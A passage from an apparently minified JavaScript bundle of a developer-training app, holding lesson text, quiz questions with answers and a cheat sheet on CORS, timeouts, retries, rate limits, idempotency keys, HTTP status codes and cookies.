app.UseCors("web"); // before auth middleware`}},{type:"list",items:["The **browser** checks CORS. Postman, curl and server-to-server calls ignore it.","Fix CORS on the **API**, not in the frontend code.","`Access-Control-Allow-Origin: *` does not work together with cookies (credentials).","In local dev, a dev-server proxy (for example Vite `server.proxy`) makes calls same-origin."]}],remember:'CORS = the browser asks the API "may this origin read your answer?" Fix it on the API.',questions:[{id:"web.cors.1",kind:"debug",difficulty:"easy",prompt:"The frontend shows a CORS error, but the same request in Postman works fine. Why?",choices:["Postman uses a different network route that skips the firewall","CORS is checked by the browser; Postman does not check it","The API detects browser user agents and blocks them","Postman formats the JSON body in a way the API accepts"],answer:1,why:"The server answered both times. The browser then checked the CORS headers and refused to give the response to your JavaScript. Postman has no such rule.",remember:"Works in Postman, fails in browser → think CORS."},{id:"web.cors.2",kind:"scenario",difficulty:"medium",prompt:"Your React dev server runs on `http://localhost:5173`, the API on `http://localhost:5000`. You get CORS errors. What is the right fix?",choices:["Add `mode: 'no-cors'` to every fetch call","Allow `http://localhost:5173` in the API's CORS policy","Start the browser with web security disabled","Move the frontend to port 5000 as well"],answer:1,why:"Different ports = different origins, so the API must allow the frontend origin (or you use the dev-server proxy). `no-cors` gives you an empty response that you cannot read. Turning off browser security only hides the problem on your machine."},{id:"web.cors.3",kind:"debug",difficulty:"hard",prompt:"GET calls work. A `POST` with a JSON body fails with a CORS error. The Network tab shows an `OPTIONS` request that got `401`. What is going on?",choices:["Browsers do not allow JSON bodies in cross-origin calls","POST is never allowed cross-origin; only GET can be shared","The preflight is blocked by auth before CORS can answer","The server must disable OPTIONS so POST can go through"],answer:2,why:"The JSON body makes the browser send a preflight. Preflights carry no credentials, so if auth runs first it returns 401 without CORS headers. Put CORS before auth so OPTIONS gets a proper answer."},{id:"web.cors.4",kind:"mcq",difficulty:"medium",prompt:"The API answers with `Access-Control-Allow-Origin: *`. The frontend calls it with `credentials: 'include'` to send cookies. What happens?",choices:["It works, because `*` allows every site, cookies or not","The browser refuses to let the page read the response","The server rejects the request with a 403 before it runs","The browser drops the cookie and sends the call without it"],answer:1,why:"With credentials, browsers do not accept the `*` wildcard. The API must send the exact origin plus `Access-Control-Allow-Credentials: true`."}]},{id:"web.reliability",title:"Timeouts, retries, rate limits, idempotency",summary:"Networks fail. Plan for it.",minutes:5,blocks:[{type:"text",text:"Every network call can be slow, fail, or hang (never answer). Good clients use a **timeout**, then maybe **retry** with a pause. Good servers protect themselves with a **rate limit**: a maximum number of requests per client in a time window."},{type:"list",items:["**Timeout** — how long you wait before you stop waiting. .NET `HttpClient` waits 100 seconds by default. Browser `fetch` has no timeout option of its own.","**Retry** — only for errors that may go away: timeouts, `502`, `503`, `504`, and `429` after waiting. Never for `400`, `401`, `403`, `404` — same request, same answer.","**Backoff** — wait longer between tries. Add a little randomness (**jitter**), so clients do not all retry at the same moment."]},{type:"code",code:{lang:"ts",text:`const res = await fetch('/api/report', {
  signal: AbortSignal.timeout(5000), // stop waiting after 5 s
});`}},{type:"diagram",text:`try 1 ✗  wait 1 s
try 2 ✗  wait 2 s
try 3 ✗  wait 4 s   (+ random jitter)
try 4 ✓`},{type:"code",code:{lang:"http",text:`HTTP/1.1 429 Too Many Requests
Retry-After: 30`}},{type:"text",text:`The hard case: a **POST times out**. Did the server create the payment or not? You cannot know.
Fix: an **idempotency key**. The client makes a unique id per action. The server remembers it and returns the first result for any repeat.`},{type:"code",code:{lang:"http",text:`POST /api/payments HTTP/1.1
Idempotency-Key: 3f6c1a2e-9b7d-4c1e-a0f2-5d8e7b6c4a19
Content-Type: application/json

{"orderId": 42, "amount": 50}`}}],remember:"Always set a timeout. Retry only temporary errors, with backoff. Make retried POSTs safe with an idempotency key.",questions:[{id:"web.reliability.1",kind:"scenario",difficulty:"medium",prompt:"Your API calls a payment provider. The call times out after 30 s. You do not know if the charge happened. What is the safest design?",choices:["Retry immediately, up to 10 times","Send an idempotency key so a retry cannot charge twice",'Show an error and let the user click "Pay" again',"Raise the timeout to 10 minutes"],answer:1,why:"With the same key, the provider sees a retry as the same payment and does not charge again. Retrying without a key can charge twice, whether the code retries or the user clicks again.",remember:"Retrying a POST? Add an idempotency key."},{id:"web.reliability.2",kind:"perf",difficulty:"hard",prompt:"A service that your API calls (a downstream service) gets slow. Your 50 API instances each retry failed calls 5 times **immediately**, with no delay. The downstream service now goes down completely. What happened?",choices:["Retries multiplied the load at the worst moment","The timeout was too long","The downstream service needs more indexes","HTTP/2 was turned off"],answer:0,why:"Each failed call became up to 6 calls, all at once. A service that was already slow got several times more traffic. Use backoff with jitter and a retry limit. A circuit breaker can also help: it stops calls for a while after many failures.",remember:'Retries without backoff can turn "slow" into "down".'},{id:"web.reliability.3",kind:"mcq",difficulty:"easy",prompt:"Which response is usually useless to retry automatically?",choices:["503 Service Unavailable","400 Bad Request","429 Too Many Requests (after waiting)","A network timeout"],answer:1,why:"400 means the request itself is wrong. Sending the same request again gives the same 400. The others are often temporary."},{id:"web.reliability.4",kind:"perf",difficulty:"medium",prompt:"Your .NET API calls a partner API using default `HttpClient` settings. When the partner stops answering, many of your requests wait about 100 seconds each. What should you add first?",choices:["More logging around the partner call","A retry with no delay between tries","A larger connection pool for HttpClient","A short, explicit timeout for that call"],answer:3,why:"The default HttpClient timeout is 100 s. Set a short timeout, based on what the partner normally needs. Then your requests stop waiting quickly. You can return an error fast or show a fallback (backup) answer."}]}],cheatSheet:[{title:"HTTP methods",items:[{term:"GET",meaning:"Read · safe ✅ · idempotent ✅"},{term:"POST",meaning:"Create / action · safe ❌ · idempotent ❌"},{term:"PUT",meaning:"Replace whole resource · safe ❌ · idempotent ✅"},{term:"PATCH",meaning:"Change some fields · safe ❌ · idempotent: not guaranteed"},{term:"DELETE",meaning:"Remove · safe ❌ · idempotent ✅"},{term:"Idempotent",meaning:"1 call or 5 calls → same server state"}]},{title:"Status codes",items:[{term:"200 / 201 / 204",meaning:"OK / Created / OK, no body"},{term:"304",meaning:"Not Modified — use your cached copy"},{term:"400",meaning:"Bad request — fix the input, do not retry"},{term:"401",meaning:"Not authenticated — who are you?"},{term:"403",meaning:"Authenticated, but not allowed"},{term:"404 / 409",meaning:"Not found / conflicts with current state"},{term:"429",meaning:"Rate limited — wait (see Retry-After)"},{term:"500",meaning:"Server bug or crash"},{term:"502 / 503 / 504",meaning:"Proxy got bad answer / unavailable / proxy timed out"}]},{title:"Headers & cookies",items:[{term:"Content-Type",meaning:"Format of the body, for example application/json"},{term:"Authorization",meaning:"Credentials, for example Bearer <token>"},{term:"Set-Cookie / Cookie",meaning:"Server stores a value / browser sends it back automatically"},{term:"HttpOnly",meaning:"JavaScript cannot read the cookie"},{term:"Secure",meaning:"Cookie only sent over HTTPS"},{term:"SameSite",meaning:"Controls sending the cookie on requests from other sites"},{term:"Session",meaning:"Data on the server; cookie holds only the id"}]},{title:"Auth, CORS, reliability",items:[{term:"AuthN vs AuthZ",meaning:"Who are you? vs What may you do?"},{term:"JWT",meaning:"header.payload.signature — payload readable, signature stops changes"},{term:"CORS",meaning:"Browser rule: may this origin read the response? Fix on the API"},{term:"Preflight",meaning:"OPTIONS sent first for JSON bodies, custom headers, PUT/DELETE"},{term:"Timeout",meaning:"Always set one; .NET HttpClient default is 100 s"},{term:"Retry",meaning:"Only temporary errors, with backoff + jitter"},{term:"Idempotency-Key",meaning:"Makes a retried POST run only once"}]}]},we=Object.freeze(Object.defineProperty({__proto__:null,default:fe},Symbol.toStringTag,{value:"Module"})),be=["thinking","basics","data-structures","algorithms","performance","runtime","oop","clean-code","testing","git","database","web","networking","frontend","concurrency","debugging","architecture","distributed-systems","devops","security","ai","business","erp","sales","purchasing","inventory","manufacturing","logistics","accounting","payments","hr-payroll","healthcare","education","booking"],ke=Object.assign({"./accounting/index.ts":o,"./ai/index.ts":h,"./algorithms/index.ts":l,"./architecture/index.ts":m,"./basics/index.ts":p,"./booking/index.ts":y,"./business/index.ts":w,"./clean-code/index.ts":k,"./concurrency/index.ts":T,"./data-structures/index.ts":I,"./database/index.ts":S,"./debugging/index.ts":V,"./devops/index.ts":O,"./distributed-systems/index.ts":q,"./education/index.ts":R,"./erp/index.ts":M,"./frontend/index.ts":W,"./git/index.ts":H,"./healthcare/index.ts":U,"./hr-payroll/index.ts":G,"./inventory/index.ts":Y,"./logistics/index.ts":z,"./manufacturing/index.ts":J,"./networking/index.ts":Z,"./oop/index.ts":ee,"./payments/index.ts":ne,"./performance/index.ts":ie,"./purchasing/index.ts":oe,"./runtime/index.ts":he,"./sales/index.ts":le,"./security/index.ts":me,"./testing/index.ts":pe,"./thinking/index.ts":ye,"./web/index.ts":we}),a=be.map(e=>{var t;return(t=ke[`./${e}/index.ts`])==null?void 0:t.default}).filter(e=>!!e),i=new Map,ve=new Map;for(const e of a)for(const t of e.lessons){ve.set(t.id,{lesson:t,category:e});for(const n of t.questions)i.set(n.id,{question:n,lesson:t,category:e})}const Te=[...i.values()],xe=e=>a.find(t=>t.id===e),Ie=[{id:"dev",title:"Developer skills",note:"How code, data and systems work"},{id:"domain",title:"Business domains · Nghiệp vụ",note:"The real work IT serves. English + Tiếng Việt."}],Ae=e=>e.group??"dev";export{Ie as G,Ae as a,Te as b,a as c,xe as g,ve as l,i as q};
